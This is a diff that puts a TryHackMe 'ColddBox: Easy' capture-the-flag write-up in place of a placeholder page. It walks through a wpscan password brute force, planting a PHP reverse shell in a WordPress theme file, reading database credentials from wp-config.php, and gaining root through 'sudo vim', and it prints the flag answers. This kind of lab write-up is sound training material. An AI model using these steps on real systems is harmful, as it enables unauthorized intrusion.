@@ -1,58 +1,181 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Colddbox | Writeup</title>
-  <link href="https://cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css" rel="stylesheet">
-  <style>
-    body {
-      background: #0d1117;
-      color: #c9d1d9;
-      font-family: 'Hack', monospace;
-      padding: 40px;
-      max-width: 800px;
-      margin: auto;
-    }
-    h1 {
-      color: #58a6ff;
-      font-size: 2.4em;
-    }
-    h2 {
-      color: #58a6ff;
-      margin-top: 30px;
-      font-size: 1.8em;
-    }
-    p {
-      font-size: 1.1em;
-      line-height: 1.6em;
-    }
-    code {
-      background: #161b22;
-      padding: 2px 4px;
-      border-radius: 4px;
-    }
-    a {
-      color: #58a6ff;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-  </style>
-</head>
-<body>
-  <h1>Colddbox</h1>
-  <p>Status: <strong>In progress...</strong></p>
+Can you get access and get both flags?
 
-  <h2>Enumeration</h2>
-  <p>In progress...</p>
+Good Luck!
 
-  <h2>Exploitation</h2>
-  <p>In progress...</p>
+Let’s start with enumeration, do nmap.
 
-  <h2>Privilege Escalation</h2>
-  <p>In progress...</p>
+┌──(kali㉿kali)-[~/Documents/tryhackme/Ghizer]
+└─$ nmap -sV 10.10.91.62
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 21:06 WIB
+Nmap scan report for 10.10.91.62
+Host is up (0.38s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 
-  <p><a href="../index.html">← Back to Writeups</a></p>
-</body>
-</html>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.42 seconds
+
+Access the http port, we found the wordpress website.
+
+Using wpscan, let’s do enumerating website, and we found the username and password for login.
+
+┌──(kali㉿kali)-[~/Documents/tryhackme/colddbox]
+└─$ wpscan --url http://10.10.91.62/ -e u -P /usr/share/wordlists/rockyou.txt
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________[+] URL: http://10.10.91.62/ [10.10.91.62]
+[+] Started: Sat Sep 23 21:43:13 2023Interesting Finding(s):[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%[+] XML-RPC seems to be enabled: http://10.10.91.62/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://10.10.91.62/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://10.10.91.62/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.91.62/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
+ |  - http://10.10.91.62/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.91.62/wp-content/themes/twentyfifteen/
+ | Last Updated: 2023-08-08T00:00:00.000Z
+ | Readme: http://10.10.91.62/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 3.5
+ | Style URL: http://10.10.91.62/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.91.62/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:03 <=====> (10 / 10) 100.00% Time: 00:00:03[i] User(s) Identified:[+] the cold in person
+ | Found By: Rss Generator (Passive Detection)[+] c0ldd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)[+] hugo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)[+] philip
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)[+] Performing password attack on Wp Login against 4 user/s
+[SUCCESS] - c0ldd / 9876543210
+
+Access /wp-login and we have successfully entered the WordPress dashboard. Access appearance > Editor, then enter reverse shell, I used reference from https://github.com/pentestmonkey/php-reverse-shell
+
+Create listener, and access reverse shell http://10.10.91.62/wp-content/themes/twentyfifteen/404.php
+
+┌──(kali㉿kali)-[~/Documents/tryhackme/colddbox]
+└─$ rlwrap nc -nlvp 8910
+listening on [any] 8910 ...
+
+Look for the first flag, we get the file, but it looks like this user doesn’t have access to it.
+
+$ find / -name user.txt
+/home/c0ldd/user.txt
+$ cd /home/c0ldd/
+$ ls
+user.txt
+$ cat user.txt
+cat: user.txt: Permission denied
+
+go to var/www/html to look for wp-config.php, and we find the username and password here.
+
+/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'cybersecurity');/** MySQL hostname */
+define('DB_HOST', 'localhost');/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+access ssh, looks like we’re in :)
+
+┌──(kali㉿kali)-[~/Documents/tryhackme/colddbox]
+└─$ ssh c0ldd@10.10.91.62 -p 4512
+The authenticity of host '[10.10.91.62]:4512 ([10.10.91.62]:4512)' can't be established.
+ED25519 key fingerprint is SHA256:4Burx9DOSmBG9A0+DFqpM7rY4cyqpq59iluJwKx690c.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.91.62]:4512' (ED25519) to the list of known hosts.
+c0ldd@10.10.91.62's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Pueden actualizarse 129 paquetes.
+92 actualizaciones son de seguridad.
+Last login: Mon Nov  8 13:20:08 2021 from 10.0.2.15
+
+look for the flag file, and we find the user.txt flag.
+
+c0ldd@ColddBox-Easy:~$ ls
+user.txt
+c0ldd@ColddBox-Easy:~$ cat user.txt
+RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
+
+    user.txt
+
+    Answer : RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
+
+It can be seen that the user can access Vim, Chmod, and FTP.
+
+c0ldd@ColddBox-Easy:~$ sudo -l
+[sudo] password for c0ldd: 
+Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+    (root) /usr/bin/vim
+    (root) /bin/chmod
+    (root) /usr/bin/ftp
+
+lakukan privesc dengan spawn root shell
+
+c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
+
+#
+
+look for the last flag, we find root.txt.
+
+# ls
+user.txt
+# find / -name root.txt
+/root/root.txt
+# cat /root/root.txt
+wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
+
+    root.txt
+
+    Answer : wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
+
+Conslusion:
+
+Here, we have completed the ColddBox: Easy room.
+
+Stay connected with me! Feel free to reach out through my social media
